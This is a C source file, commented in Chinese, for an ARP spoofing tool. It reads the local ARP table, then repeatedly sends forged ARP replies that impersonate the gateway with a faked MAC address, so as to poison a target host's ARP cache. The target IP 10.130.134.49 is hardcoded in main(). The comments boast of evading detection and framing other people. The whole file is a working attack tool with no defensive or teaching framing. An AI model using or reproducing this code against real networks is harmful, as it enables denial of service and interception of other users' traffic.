#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>

#include "net_util.h"
#include "arp_attack.h"
#include "../common/logger.h"

enum StateType stateType = StateType_Stop;

void printArpMap(ArpMap *arpMap) {
    string ip = ip2Str(arpMap->ip);
    string mac = mac2Str(arpMap->mac);
    printf("%s -> %s\n", ip, mac);
}

void printIp(string source, uint8_t *ip) {
    printf("%s ip ", source);
    for (int i = 0; i < 4; i++) {
        printf("%d.", ip[i]);
    }
    printf("\n");
}

void printMac(string source, uint8_t *hw) {
    printf("%s mac ", source);
    for (int i = 0; i < 6; i++) {
        printf("0x%x:", hw[i]);
    }
    printf("\n");
}

void arpAttack2(string ifaname, ArpMap *targetArpMap, ArpMap *gatewayArpMap) {
    int sock, size, bytes_send;
    struct sockaddr_ll sin;
    memset(&sin, 0, sizeof(sin));
    sin.sll_family = AF_PACKET;
    sin.sll_halen = htons(6);

    long hwlast = str16Tolong("0xaa");
    //源mac随便伪造一个，避免被查到。除非通过物理监控查到（这里伪造成网关）
    uint8_t src_mac[6];
    for (int i = 0; i < 6; i++) {
        src_mac[i] = gatewayArpMap->mac[i];
    }
    src_mac[5] = hwlast;
    printMac("源mac", src_mac);

    memcpy(sin.sll_addr, src_mac, 6);
    if ((sin.sll_ifindex = if_nametoindex(ifaname)) == 0) {
        perror("if_nametoindex() failed to obtain interface index ");
        exit(EXIT_FAILURE);
    }
    size = 60;
    uint8_t data[size];
    memset(&data, 0, sizeof(data));

    //bro_hw 攻击目标的mac地址
//    uint8_t bro_hw[] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };//所有
    uint8_t bro_hw[6];
    for (int i = 0; i < 6; i++) {
        bro_hw[i] = targetArpMap->mac[i];
    }
    printMac("目标mac", bro_hw);

    //src_hw 假冒这个人（告诉目标是这个ipmac对应的主机发送的。这里可以栽赃给别人 啦啦啦。现在伪造是网关发送过来的。）
    uint8_t src_ip[4]; //
    for (int i = 0; i < 4; i++) {
        src_ip[i] = gatewayArpMap->ip[i];
    }
    printIp("假冒ip", src_ip);
    uint8_t src_hw[6]; //tell
    for (int i = 0; i < 6; i++) {
        src_hw[i] = gatewayArpMap->mac[i];
    }
    src_hw[5] = hwlast;
    printMac("假冒mac", src_hw);

    //dec_hw 发给攻击目标的 ip mac 映射（利用这个内容去修改目标的arp映射表，现在把mac地址修改成错误的。啦啦啦）
    uint8_t dec_ip[4];
    for (int i = 0; i < 4; i++) {
        dec_ip[i] = gatewayArpMap->ip[i];
    }
    printIp("修改映射mac", dec_ip);
    //	uint8_t dec_hw[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; //who has
    uint8_t dec_hw[6];
    for (int i = 0; i < 6; i++) {
        dec_hw[i] = gatewayArpMap->mac[i];
    }
    dec_hw[5] = hwlast;  //修改mac最后位aa
    printMac("修改映射mac", dec_hw);

    //以太网首部
    printf("create ethhead, ethhdr size=%ld字节\r\n", sizeof(struct ethhdr));
    struct ethhdr *ethhead = (struct ethhdr *) data;
    printf("1.广播mac地址\r\n");
    memcpy(ethhead->h_dest, bro_hw, 6);
    printf("2.源mac地址\r\n");
    memcpy(ethhead->h_source, src_hw, 6);
    printf("3.帧类型 ARP_FRAME_TYPE\r\n");
    //ip:0800,arp:0x0806,rarp:0x0835
    ethhead->h_proto = htons(0x0806);
    //----------------------------------------------------
    Arp *arppacket = (Arp *) (data + sizeof(struct ethhdr));

    printf("4.arp请求 应答\r\n");
    printf("create arppacket, ArpPacket size=%ld字节, 除了padding是28字节\r\n", sizeof(Arp));
    arppacket->hw_type = htons(0x0001);     //硬件类型
    arppacket->prot_type = htons(0x0800);   //协议类型
    arppacket->hw_addr_size = 6;               //硬件地址长度
    arppacket->prot_addr_size = 4;             //协议地址长度
    arppacket->op = htons(0x0002);          //操作类型    OP_ARP_QUEST 1  OP_ARP_REQUEST 2
    printf("发送端源mac地址\r\n");
    memcpy(arppacket->sndr_hw_addr, src_hw, 6);
    printf("发送端源ip地址\r\n");
    memcpy(arppacket->sndr_ip_addr, src_ip, 4);
    printf("目的mac地址\r\n");
    memcpy(arppacket->rcpt_hw_addr, dec_hw, 6);
    printf("目的ip地址\r\n");
    memcpy(arppacket->rcpt_ip_addr, dec_ip, 4);
    printf("padding\r\n");
    bzero(arppacket->padding, 18);

    printf("start send\r\n");

    sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        printf("create socket error!\r\n");
        exit(1);
    } else {
        printf("create socket!\r\n");
    }
    printf("[");
    for (int i = 0; i < size; i++) {
        printf("0x%x ", data[i]);
    }
    printf("] \r\n");

    int i = 0;
    while (stateType == StateType_Attack) {
//    for (int i = 0; i < 100; i++) {
        bytes_send = sendto(sock, &data, sizeof(data), 0, (struct sockaddr *) &sin, sizeof(sin));
        if (bytes_send <= 0) {
            perror("sendto() failed");
            exit(EXIT_FAILURE);
        }
        sleep(1);
        if (i < 9) {
            printf("send %d times! \r\n", i);
        }
        i++;
    }
    printf("end send\r\n");
}

void arpAttack(string targetIp) {
    printf("0.attack target ip %s \n", targetIp);
    //获取网卡名
    string ifaname = ifaName();
    printf("1.当前网卡名 %s \n", ifaname);

    //获取网关地址
    u_byte *ipv4 = gateway();
    string gatewayIp = ip2Str(ipv4);
    printf("2.gateway ip %s %s \n", gatewayIp, Route_Path);

    //ping目标ip
    printf("3.ping %s \n", targetIp);
    ping(targetIp);

    //通过ip获取mac
    printf("4.show arp table %s\n", Arp_Path);
    ArrayList *arpMaps = arpMap();
    ArpMap *targetArpMap = NULL;
    ArpMap *gatewayArpMap = NULL;
    if (arpMaps != NULL) {
        for (int i = 0; i < arpMaps->length; i++) {
            ArpMap *arpMap = indexArrayList(arpMaps, i);
            string ip = ip2Str(arpMap->ip);
            string mac = mac2Str(arpMap->mac);
            printf("%s -> %s\n", ip, mac);
            if (compareStr(targetIp, ip)) {
                targetArpMap = arpMap;
            }
            if (compareStr(gatewayIp, ip)) {
                gatewayArpMap = arpMap;
            }
        }
    }
    printf("5.target ip mac \n");
    printArpMap(targetArpMap);
    printf("6.gateway ip mac \n");
    printArpMap(gatewayArpMap);
    printf("Complete preparation! \n");
    while (true) {
        printf("command: 1 attack;2 stop; 3 exit \n");
        int num;
        // %f 匹配浮点型数据
        scanf("%d", &num);
        if (num == 1) {
            printf("start attack... ^_^ \n");
            if (stateType == StateType_Stop) {
                stateType = StateType_Attack;
                arpAttack2(ifaname, targetArpMap, gatewayArpMap);
            }
        } else if (num == 2) {
            printf("stop attack... *_* \n");
            stateType = StateType_Stop;
        } else if (num == 3) {
            printf("exit... *_* \n");
            stateType = StateType_Stop;
            cover_sleep(1);
            break;
        }
    }
}

void loggerTest() {
    //日志输出到 var/log/syslog
    logger_reset_state();
    log_warning("This message goes to syslog");
    logger_set_out_stdout();
    log_status("Hello!");
    logger_set_log_file("log.txt");
    log_error("Logger in a file mode!");
}

int main(int argc, char *argv[]) {
    arpAttack("10.130.134.49");
//    loggerTest();
//    interfaceTest();
    return 0;
}